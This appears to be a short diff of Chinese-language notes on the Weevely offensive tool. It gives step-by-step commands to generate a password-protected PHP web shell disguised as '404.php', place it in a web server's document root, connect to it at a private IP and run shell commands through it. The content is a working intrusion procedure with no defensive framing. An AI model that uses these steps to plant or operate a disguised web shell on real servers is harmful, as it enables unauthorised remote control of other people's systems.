@@ -1,0 +1,6 @@
+weevely generate www8899878+ 404.php  # 生成一个404文件 密码www8899878+
+启动服务器
+mv 404.php /var/www/html #移动文件到服务器
+weevely http://192.168.1.199/404.php www8899878+
+help 可以查询使用的模块
+ls cd pwd
